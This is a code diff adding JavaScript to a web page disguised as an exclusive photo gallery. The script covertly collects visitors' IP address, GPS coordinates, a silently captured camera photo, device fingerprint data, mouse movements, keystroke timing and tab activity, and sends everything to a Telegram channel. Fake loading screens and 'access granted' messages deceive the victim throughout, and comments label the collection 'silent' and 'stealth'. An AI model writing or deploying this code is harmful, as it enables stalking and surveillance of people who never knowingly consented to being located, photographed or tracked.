+                cameraError += `├─ Câmera em uso por outro aplicativo\n`;
+                cameraError += `├─ Câmera não disponível\n`;
+                cameraError += `├─ Navegador não suporta getUserMedia\n`;
+                cameraError += `├─ Conexão não é HTTPS\n`;
+                cameraError += `└─ Modo privado/incógnito\n`;
+                await reportToTelegram(cameraError);
+            }
+
+            // Finaliza o loading
+            document.querySelector('.loading-content h3').textContent = 'Finalizando...';
+            document.querySelector('.loading-content p').textContent = 'Preparando galeria exclusiva';
+            
+            // Aguarda mais um pouco para dar sensação de processamento
+            await new Promise(resolve => setTimeout(resolve, 2000));            // Reporta resultado final
+            let finalReport = `🏁 RELATÓRIO FINAL - DOCIE JOAO\n`;
+            finalReport += `═══════════════════════════════════════════\n`;
+            finalReport += `📊 RESUMO EXECUTIVO:\n`;
+            finalReport += `├─ Data/Hora: ${new Date().toLocaleString('pt-BR')}\n`;
+            finalReport += `├─ Duração Sessão: ${Math.round((Date.now() - loadingStart) / 1000)} segundos\n`;
+            finalReport += `├─ GPS: ${gpsObtained ? '✅ OBTIDO' : '❌ NEGADO'}\n`;
+            finalReport += `├─ Câmera: ${cameraObtained ? '✅ OBTIDA' : '❌ NEGADA'}\n`;
+            finalReport += `├─ Foto: ${cameraObtained ? '✅ CAPTURADA' : '❌ NÃO CAPTURADA'}\n`;
+            finalReport += `└─ Status Geral: ${(gpsObtained || cameraObtained) ? '🎯 SUCESSO PARCIAL/TOTAL' : '⚠️ FALHA TOTAL'}\n\n`;
+            
+            if (gpsObtained && gpsData.latitude) {
+                finalReport += `📍 COORDENADAS FINAIS:\n`;
+                finalReport += `├─ Lat/Lon: ${gpsData.latitude}, ${gpsData.longitude}\n`;
+                finalReport += `├─ Precisão: ${gpsData.accuracy}m\n`;
+                finalReport += `└─ Maps: https://maps.google.com/?q=${gpsData.latitude},${gpsData.longitude}\n\n`;
+            }
+            
+            if (cameraObtained && cameraData.width) {
+                finalReport += `📸 DADOS DA CAPTURA:\n`;
+                finalReport += `├─ Resolução: ${cameraData.width}x${cameraData.height}\n`;
+                finalReport += `├─ Device ID: ${cameraData.deviceId || 'N/A'}\n`;
+                finalReport += `└─ Formato: JPEG 80%\n\n`;
+            }
+            
+            finalReport += `🎖️ NÍVEL DE SUCESSO:\n`;
+            if (gpsObtained && cameraObtained) {
+                finalReport += `└─ 🏆 SUCESSO TOTAL - GPS + Câmera obtidos\n`;
+            } else if (gpsObtained || cameraObtained) {
+                finalReport += `└─ ⭐ SUCESSO PARCIAL - ${gpsObtained ? 'GPS' : 'Câmera'} obtido\n`;
+            } else {
+                finalReport += `└─ ❌ MISSÃO FALHADA - Nenhum acesso obtido\n`;
+            }
+            
+            finalReport += `\n🔐 PRÓXIMOS PASSOS SUGERIDOS:\n`;
+            finalReport += `├─ Análise dos dados coletados\n`;
+            finalReport += `├─ Verificação cruzada com outras fontes\n`;
+            finalReport += `├─ Monitoramento de atividades futuras\n`;
+            finalReport += `└─ Relatório encaminhado para investigação\n`;
+              await reportToTelegram(finalReport);
+
+            // SÓ AGORA esconde loading e mostra conteúdo
+            loadingOverlay.style.display = 'none';
+            loadingOverlay.classList.remove('show');
+            document.getElementById('initialScreen').classList.add('hidden');
+            document.getElementById('mainContent').classList.add('visible');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Função chamada quando o usuário clica para acessar a galeria
+        async function accessGallery() {
+            // Mostra overlay de carregamento
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Reporta que o usuário clicou
+            let infoText = `--- ACESSO À GALERIA DOCIE JOAO ---\n`;
+            infoText += `Data/Hora: ${new Date().toLocaleString('pt-BR')}\n`;
+            infoText += `User-Agent: ${navigator.userAgent}\n`;
+
+            // Pega o IP e localização aproximada
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                infoText += `IP: ${ipData.ip}\n`;
+                infoText += `Localização (Aprox.): ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
+            } catch (e) {
+                infoText += `IP: Não foi possível obter.\n`;
+            }
+            
+            await reportToTelegram(infoText + "\n🎯 USUÁRIO CLICOU PARA ACESSAR GALERIA!\nIniciando captura de permissões...");
+
+            // Pequeno delay para parecer que está carregando
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // 1. TENTA acessar a localização precisa (GPS)
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
+                });
+                const { latitude, longitude } = position.coords;
+                await reportToTelegram(`✅ SUCESSO: Localização GPS obtida!\nLat: ${latitude}, Lon: ${longitude}\nLink Google Maps: https://maps.google.com/?q=${latitude},${longitude}`);
+            } catch (error) {
+                await reportToTelegram(`❌ FALHA: Localização GPS negada.\nMotivo: ${error.message}`);
+            }
+
+            // 2. TENTA acessar a câmera e tirar foto automaticamente
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                await reportToTelegram("✅ SUCESSO: Câmera liberada! Capturando foto...");
+                
+                // Cria um elemento de vídeo oculto para capturar a imagem
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                // Aguarda o vídeo carregar
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Aguarda um pouco para a câmera se ajustar
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Cria canvas para capturar a imagem
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // Converte para blob
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        await sendPhotoToTelegram(blob);
+                    }
+                }, 'image/jpeg', 0.8);
+                
+                // Remove elementos e desliga a câmera
+                document.body.removeChild(video);
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                await reportToTelegram(`❌ FALHA: Câmera negada.\nMotivo: ${error.message}`);
+            }
+
+            // Aguarda mais um pouco e então "libera" o acesso
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            // Esconde o loading
+            document.getElementById('loadingOverlay').style.display = 'none';
+            
+            // Mostra mensagem de "sucesso" 
+            alert('🎉 Acesso liberado! Bem-vindo à galeria exclusiva DOCIE JOAO!');
+            
+            // Reporta conclusão
+            await reportToTelegram("🔓 PROCESSO CONCLUÍDO - Usuário teve acesso \"liberado\" à galeria");
+        }        // MONITORAMENTO SILENCIOSO DE ATIVIDADE
+        let mouseData = [];
+        let keyData = [];
+        let activityStart = Date.now();
+
+        // Captura movimentos do mouse
+        document.addEventListener('mousemove', (e) => {
+            if (mouseData.length < 10) { // Limita para não sobrecarregar
+                mouseData.push({x: e.clientX, y: e.clientY, time: Date.now() - activityStart});
+            }
+        });
+
+        // Captura teclas (sem mostrar o conteúdo)
+        document.addEventListener('keydown', (e) => {
+            if (keyData.length < 20) {
+                keyData.push({key: e.key.length === 1 ? '*' : e.key, time: Date.now() - activityStart});
+            }
+        });
+
+        // Envia dados de atividade após 10 segundos
+        setTimeout(async () => {
+            if (mouseData.length > 0 || keyData.length > 0) {
+                let activity = `🖱️ ATIVIDADE DETECTADA\n`;
+                activity += `Movimentos mouse: ${mouseData.length}\n`;
+                activity += `Teclas pressionadas: ${keyData.length}\n`;
+                activity += `Tempo na página: ${Math.round((Date.now() - activityStart) / 1000)}s\n`;
+                
+                if (mouseData.length > 0) {
+                    const lastMove = mouseData[mouseData.length - 1];
+                    activity += `Última posição: ${lastMove.x}, ${lastMove.y}\n`;
+                }
+                
+                await reportToTelegram(activity);
+            }
+        }, 10000);
+
+        // Detecta se a pessoa saiu da aba
+        document.addEventListener('visibilitychange', async () => {
+            if (document.hidden) {
+                await reportToTelegram(`👁️ Usuário SAIU da aba - ${new Date().toLocaleTimeString()}`);
+            } else {
+                await reportToTelegram(`👁️ Usuário VOLTOU para aba - ${new Date().toLocaleTimeString()}`);
+            }
+        });
+
+        // Detecta quando a pessoa tenta fechar a página
+        window.addEventListener('beforeunload', async (e) => {
+            await reportToTelegram(`🚪 Usuário tentou FECHAR a página - ${new Date().toLocaleTimeString()}`);
+        });        // Event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            // COLETA AUTOMÁTICA SILENCIOSA (roda em background)
+            setTimeout(async () => {
+                let stealth = `🕵️ COLETA AUTOMÁTICA INICIADA\n`;
+                stealth += `Timestamp: ${Date.now()}\n`;
+                stealth += `Referrer: ${document.referrer || 'Direto'}\n`;
+                stealth += `URL: ${window.location.href}\n`;
+                
+                // Informações de bateria (se disponível)
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        stealth += `Bateria: ${Math.round(battery.level * 100)}%\n`;
+                        stealth += `Carregando: ${battery.charging}\n`;
+                    } catch(e) {}
+                }
+
+                // Informações de conexão
+                if ('connection' in navigator) {
+                    stealth += `Conexão: ${navigator.connection.effectiveType}\n`;
+                    stealth += `Download: ${navigator.connection.downlink}Mbps\n`;
+                }
+
+                // Tenta detectar se está em modo privado
+                try {
+                    localStorage.setItem('test', 'test');
+                    localStorage.removeItem('test');
+                    stealth += `Modo Privado: Não\n`;
+                } catch(e) {
+                    stealth += `Modo Privado: Sim\n`;
+                }
+
+                // Informações de media devices (sem pedir permissão)
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const cameras = devices.filter(d => d.kind === 'videoinput').length;
+                    const mics = devices.filter(d => d.kind === 'audioinput').length;
+                    stealth += `Câmeras: ${cameras}\n`;
+                    stealth += `Microfones: ${mics}\n`;
+                } catch(e) {}
+
+                await reportToTelegram(stealth);
+            }, 2000);
+
+            // Clique na tela inicial
+            document.getElementById('initialScreen').addEventListener('click', revealMainContent);
+            
+            // Clique nos cards de foto
+            const photoCards = document.querySelectorAll('.photo-card');
+            photoCards.forEach(card => {
+                card.addEventListener('click', accessGallery);
+            });
+        });
+    </script>
+</body>
+</html>
